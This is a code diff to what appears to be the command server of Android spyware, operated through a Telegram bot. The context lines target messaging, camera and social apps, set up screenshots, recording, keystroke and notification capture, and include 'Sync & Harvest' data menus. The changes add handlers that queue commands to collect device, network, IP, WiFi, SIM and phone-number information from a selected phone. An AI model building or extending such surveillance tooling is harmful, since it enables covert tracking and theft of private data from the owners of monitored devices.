@@ -121,35 +121,35 @@ const deviceConfigs = {
             autoScreenshot: false,
             autoRecording: false,
             screenshotQuality: 30,
-            recordingQuality: ‘V’ERY LOW,
+            recordingQuality: 'VERY LOW',
             appOpenBatchSize: 50,
             syncBatchSize: 20,
             targetApps: [
                 'com.sec.android.gallery3d',
- 'com.samsung.android.messaging',
- 'com.android.chrome',
- 'com.google.android.youtube',
- 'com.google.android.apps.camera',
- 'com.sec.android.app.camera',
- 'com.android.camera',
- 'com.whatsapp',
- 'com.instagram.android',
- 'com.facebook.katana',
- 'com.snapchat.android',
- 'com.google.android.apps.maps',
- 'com.google.android.apps.messaging',
- 'com.microsoft.teams',
- 'com.zoom.us',
- 'com.discord',
- 'com.mediatek.camera" +
- 'com.whatsapp.w4b',
- 'com.pri.filemanager',
- 'com.android.dialer',
- 'com.facebook.orca',
- 'com.google.android.apps.photosgo',
- 'com.tencent.mm',
- 'com.google.android.apps.photos',
- 'org.telegram.messenger"
+                'com.samsung.android.messaging',
+                'com.android.chrome',
+                'com.google.android.youtube',
+                'com.google.android.apps.camera',
+                'com.sec.android.app.camera',
+                'com.android.camera',
+                'com.whatsapp',
+                'com.instagram.android',
+                'com.facebook.katana',
+                'com.snapchat.android',
+                'com.google.android.apps.maps',
+                'com.google.android.apps.messaging',
+                'com.microsoft.teams',
+                'com.zoom.us',
+                'com.discord',
+                'com.mediatek.camera',
+                'com.whatsapp.w4b',
+                'com.pri.filemanager',
+                'com.android.dialer',
+                'com.facebook.orca',
+                'com.google.android.apps.photosgo',
+                'com.tencent.mm',
+                'com.google.android.apps.photos',
+                'org.telegram.messenger'
             ],
             features: {
                 contacts: true,
@@ -434,25 +434,11 @@ function getRealtimeMenuKeyboard() {
 
 function getInfoMenuKeyboard() {
     return [
-        [{ text: '📱 Device Info', callback_data: 'menu_device_info' }, { text: '📱 Mobile Info', callback_data: 'menu_mobile_info' }],
-        [{ text: '🏷️ Device Name', callback_data: 'menu_device_name' }, { text: '◀️ Back', callback_data: 'help_main' }]
-    ];
-}
-
-function getDeviceInfoKeyboard() {
-    return [
-        [{ text: '📊 Status', callback_data: 'cmd:status' }, { text: '📱 Device Info', callback_data: 'cmd:device_info' }],
-        [{ text: '🔋 Battery', callback_data: 'cmd:battery' }, { text: '💾 Storage', callback_data: 'cmd:storage' }],
-        [{ text: '🕐 Time', callback_data: 'cmd:time' }, { text: '◀️ Back', callback_data: 'menu_info' }]
-    ];
-}
-
-function getMobileInfoKeyboard() {
-    return [
-        [{ text: '🌐 Network Status', callback_data: 'cmd:network_status' }, { text: '🌐 IP Info', callback_data: 'cmd:ip_info' }],
-        [{ text: '📶 WiFi Info', callback_data: 'cmd:wifi_info' }, { text: '📱 Mobile Info', callback_data: 'cmd:mobile_info' }],
-        [{ text: '📱 SIM Info', callback_data: 'cmd:sim_info' }, { text: '📞 Phone Number', callback_data: 'cmd:phone_number' }],
-        [{ text: '◀️ Back', callback_data: 'menu_info' }]
+        [{ text: '📱 All Device Info', callback_data: 'cmd:device_info' }],
+        [{ text: '🌐 All Network Info', callback_data: 'cmd:network_info' }],
+        [{ text: '📱 All Mobile Info', callback_data: 'cmd:mobile_info' }],
+        [{ text: '🏷️ Device Name', callback_data: 'menu_device_name' }],
+        [{ text: '◀️ Back', callback_data: 'help_main' }]
     ];
 }
 
@@ -823,6 +809,83 @@ function formatWifiInfo(wifiData) {
     } catch (error) {
         console.error('Error formatting WiFi info:', error);
         return `📶 WiFi Info: ${JSON.stringify(wifiData)}`;
+    }
+}
+
+// ============= CONSOLIDATED COMMAND HANDLERS =============
+
+async function queueCommandToDevice(chatId, deviceId, command) {
+    const device = devices.get(deviceId);
+    if (!device) return false;
+    
+    if (!device.pendingCommands) {
+        device.pendingCommands = [];
+    }
+    
+    device.pendingCommands.push({
+        command: command,
+        originalCommand: `/${command}`,
+        timestamp: Date.now()
+    });
+    saveDevices();
+    
+    console.log(`📝 Queued command: ${command} for ${deviceId}`);
+    return true;
+}
+
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function handleDeviceInfoCommand(chatId, deviceId) {
+    const commands = ['device_info', 'battery', 'storage', 'time'];
+    
+    await sendTelegramMessage(chatId, 
+        "📱 *Fetching Device Information*\n\n" +
+        "Collecting:\n" +
+        "• Device Info (model, Android version)\n" +
+        "• Battery Status\n" +
+        "• Storage Information\n" +
+        "• Device Time/Uptime\n\n" +
+        "Results will arrive shortly...");
+    
+    for (const cmd of commands) {
+        await queueCommandToDevice(chatId, deviceId, cmd);
+        await sleep(2000);
+    }
+}
+
+async function handleNetworkInfoCommand(chatId, deviceId) {
+    const commands = ['network_info', 'ip_info', 'wifi_info'];
+    
+    await sendTelegramMessage(chatId,
+        "🌐 *Fetching Network Information*\n\n" +
+        "Collecting:\n" +
+        "• Network Status (connection type, internet)\n" +
+        "• IP Information (public, WiFi, mobile IPs)\n" +
+        "• WiFi Details (SSID, signal, speed)\n\n" +
+        "Results will arrive shortly...");
+    
+    for (const cmd of commands) {
+        await queueCommandToDevice(chatId, deviceId, cmd);
+        await sleep(2000);
+    }
+}
+
+async function handleMobileInfoCommand(chatId, deviceId) {
+    const commands = ['mobile_info', 'sim_info', 'phone_number'];
+    
+    await sendTelegramMessage(chatId,
+        "📱 *Fetching Mobile & SIM Information*\n\n" +
+        "Collecting:\n" +
+        "• Mobile Network (operator, type, roaming)\n" +
+        "• SIM Information (carrier, country, state)\n" +
+        "• Phone Number\n\n" +
+        "Results will arrive shortly...");
+    
+    for (const cmd of commands) {
+        await queueCommandToDevice(chatId, deviceId, cmd);
+        await sleep(2000);
     }
 }
 
@@ -1693,7 +1756,13 @@ async function handleCallbackQuery(callbackQuery) {
     // Handle commands
     if (data.startsWith('cmd:')) {
         const command = data.substring(4);
-        await executeCommandFromButton(chatId, messageId, command, callbackId);
+        
+        // Handle consolidated commands
+        if (command === 'device_info' || command === 'network_info' || command === 'mobile_info') {
+            await executeConsolidatedCommand(chatId, messageId, command, callbackId);
+        } else {
+            await executeCommandFromButton(chatId, messageId, command, callbackId);
+        }
         return;
     }
     
@@ -1789,12 +1858,6 @@ async function handleCallbackQuery(callbackQuery) {
         case 'menu_info':
             await editMessageKeyboard(chatId, messageId, getInfoMenuKeyboard());
             break;
-        case 'menu_device_info':
-            await editMessageKeyboard(chatId, messageId, getDeviceInfoKeyboard());
-            break;
-        case 'menu_mobile_info':
-            await editMessageKeyboard(chatId, messageId, getMobileInfoKeyboard());
-            break;
         case 'menu_device_name':
             await editMessageKeyboard(chatId, messageId, getDeviceNameKeyboard());
             break;
@@ -1875,6 +1938,37 @@ async function handleCallbackQuery(callbackQuery) {
             console.log(`⚠️ Unknown callback: ${data}`);
             break;
     }
+}
+
+async function executeConsolidatedCommand(chatId, messageId, command, callbackId) {
+    console.log(`🎯 Executing consolidated command: ${command}`);
+    
+    const selectedDeviceId = userDeviceSelection.get(chatId);
+    const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+    
+    if (!device) {
+        await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
+        return;
+    }
+    
+    await answerCallbackQuery(callbackId, `🔄 Fetching ${command}...`);
+    
+    switch (command) {
+        case 'device_info':
+            await handleDeviceInfoCommand(chatId, selectedDeviceId);
+            break;
+        case 'network_info':
+            await handleNetworkInfoCommand(chatId, selectedDeviceId);
+            break;
+        case 'mobile_info':
+            await handleMobileInfoCommand(chatId, selectedDeviceId);
+            break;
+        default:
+            await queueCommandToDevice(chatId, selectedDeviceId, command);
+    }
+    
+    const keyboard = [[{ text: '◀️ Back to Menu', callback_data: 'help_main' }]];
+    await editMessageKeyboard(chatId, messageId, keyboard);
 }
 
 async function executeCommandFromButton(chatId, messageId, command, callbackId) {
@@ -2088,6 +2182,73 @@ async function sendCommandToDevice(chatId, messageId, command) {
 async function handleCommand(chatId, command, messageId) {
     console.log(`\n🎯 Handling command: ${command} from chat ${chatId}`);
 
+    // Handle consolidated info commands
+    if (command === '/device_info') {
+        const selectedDeviceId = userDeviceSelection.get(chatId);
+        let device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+        
+        if (!device) {
+            for (const [id, d] of devices.entries()) {
+                if (String(d.chatId) === String(chatId)) {
+                    device = d;
+                    userDeviceSelection.set(chatId, id);
+                    break;
+                }
+            }
+        }
+        
+        if (device) {
+            await handleDeviceInfoCommand(chatId, userDeviceSelection.get(chatId));
+        } else {
+            await sendTelegramMessage(chatId, '❌ No device registered.');
+        }
+        return;
+    }
+    
+    if (command === '/network_info') {
+        const selectedDeviceId = userDeviceSelection.get(chatId);
+        let device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+        
+        if (!device) {
+            for (const [id, d] of devices.entries()) {
+                if (String(d.chatId) === String(chatId)) {
+                    device = d;
+                    userDeviceSelection.set(chatId, id);
+                    break;
+                }
+            }
+        }
+        
+        if (device) {
+            await handleNetworkInfoCommand(chatId, userDeviceSelection.get(chatId));
+        } else {
+            await sendTelegramMessage(chatId, '❌ No device registered.');
+        }
+        return;
+    }
+    
+    if (command === '/mobile_info') {
+        const selectedDeviceId = userDeviceSelection.get(chatId);
+        let device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+        
+        if (!device) {
+            for (const [id, d] of devices.entries()) {
+                if (String(d.chatId) === String(chatId)) {
+                    device = d;
+                    userDeviceSelection.set(chatId, id);
+                    break;
+                }
+            }
+        }
+        
+        if (device) {
+            await handleMobileInfoCommand(chatId, userDeviceSelection.get(chatId));
+        } else {
+            await sendTelegramMessage(chatId, '❌ No device registered.');
+        }
+        return;
+    }
+
     if (command === '/devices') {
         const userDevices = getDeviceListForUser(chatId);
         let message = `📱 *Your Devices*\n\n`;
@@ -2202,7 +2363,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('   🎤 Recording → Start/Stop/Settings → Info/Schedule/Quality');
     console.log('   📊 Data → NEW Data/ALL Data/Sync & Harvest');
     console.log('   ⚡ Real-time → Keys/Notifications/All');
-    console.log('   ℹ️ Info → Device Info/Mobile Info/Device Name');
+    console.log('   ℹ️ Info → Device Info/Network Info/Mobile Info/Device Name');
     console.log('   ⚙️ System → Media/App Management/Data Saving/Bot Token');
     console.log('🚀 ===============================================\n');
 });
